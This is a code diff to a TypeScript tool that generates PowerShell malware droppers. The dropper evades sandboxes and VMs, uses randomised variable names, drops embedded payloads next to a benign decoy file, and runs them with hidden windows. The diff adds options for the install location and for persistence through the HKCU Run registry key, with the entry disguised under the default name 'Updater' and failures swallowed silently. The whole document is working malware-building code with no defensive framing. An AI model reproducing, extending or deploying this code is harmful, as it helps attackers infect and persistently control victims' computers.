@@ -24,6 +24,9 @@ const MergePayloadsInputSchema = z.object({
   checkRam: z.boolean().optional(),
   checkVmProcesses: z.boolean().optional(),
   sandboxAbortMessage: z.string().optional(),
+  enablePersistence: z.boolean().optional(),
+  installPath: z.enum(['TEMP', 'APPDATA', 'SystemRoot']).optional(),
+  registryKeyName: z.string().optional(),
 });
 
 type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;
@@ -83,10 +86,11 @@ const generatePowershellDropper = (input: Required<MergePayloadsInput>): string 
     const v = {
         isSandbox: randomVar(),
         vmProcesses: randomVar(),
-        tempPath: randomVar(),
+        basePath: randomVar(),
         benignFilePath: randomVar(),
         benignFileBase64: randomVar(),
         key: randomVar(),
+        regKeyPath: randomVar(),
     };
     
     let delaySection = '';
@@ -132,7 +136,6 @@ if (${v.isSandbox}) {
             `;
         }
     }
-
 
     const payloadProcessingLoops = input.payloads.map((payload) => {
         // Random variable names per payload
@@ -194,19 +197,35 @@ try {
     if (${p_v.entryPoint}) {
         ${p_v.entryPoint}.Invoke($null, $null)
     } else {
-        ${p_v.payloadFilePath} = Join-Path ${v.tempPath} "${payload.name}"
+        ${p_v.payloadFilePath} = Join-Path ${v.basePath} "${payload.name}"
         [IO.File]::WriteAllBytes(${p_v.payloadFilePath}, ${p_v.payloadFileBytes})
         Start-Process -FilePath ${p_v.payloadFilePath} -WindowStyle Hidden
     }
 } catch {
-    ${p_v.payloadFilePath} = Join-Path ${v.tempPath} "${payload.name}"
+    ${p_v.payloadFilePath} = Join-Path ${v.basePath} "${payload.name}"
     [IO.File]::WriteAllBytes(${p_v.payloadFilePath}, ${p_v.payloadFileBytes})
     Start-Process -FilePath ${p_v.payloadFilePath} -WindowStyle Hidden
 }`;
         } else {
+            let persistenceSection = '';
+            if (input.enablePersistence) {
+                persistenceSection = `
+try {
+    ${v.regKeyPath} = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    if (-not (Test-Path ${v.regKeyPath})) {
+        New-Item -Path ${v.regKeyPath} -Force | Out-Null
+    }
+    Set-ItemProperty -Path ${v.regKeyPath} -Name "${input.registryKeyName}" -Value ${p_v.payloadFilePath} -Force
+} catch {
+    # Fail silently if cannot write to registry
+}
+                `;
+            }
+            
             executionSection = `
-${p_v.payloadFilePath} = Join-Path ${v.tempPath} "${payload.name}"
+${p_v.payloadFilePath} = Join-Path ${v.basePath} "${payload.name}"
 [IO.File]::WriteAllBytes(${p_v.payloadFilePath}, ${p_v.payloadFileBytes})
+${persistenceSection}
 Start-Process -FilePath ${p_v.payloadFilePath} -WindowStyle Hidden`;
         }
 
@@ -217,12 +236,20 @@ ${payloadDecoding}
 ${executionSection}
 `;
     }).join('\n');
+    
+    let basePathDef = '';
+    switch(input.installPath) {
+        case 'APPDATA': basePathDef = `${v.basePath} = $env:APPDATA`; break;
+        case 'SystemRoot': basePathDef = `${v.basePath} = $env:SystemRoot`; break;
+        default: basePathDef = `${v.basePath} = $env:TEMP`; break;
+    }
+
 
     return `
 ${antiAnalysisSection}
 
-${v.tempPath} = $env:TEMP
-${v.benignFilePath} = Join-Path ${v.tempPath} "${input.benign.name}"
+${basePathDef}
+${v.benignFilePath} = Join-Path $env:TEMP "${input.benign.name}"
 
 try {
     ${v.benignFileBase64} = @"
@@ -267,6 +294,9 @@ export async function mergePayloads(input: MergePayloadsInput): Promise<MergePay
             checkRam: false,
             checkVmProcesses: false,
             sandboxAbortMessage: '',
+            enablePersistence: false,
+            installPath: 'TEMP',
+            registryKeyName: 'Updater',
         },
         ...validatedInput,
     };
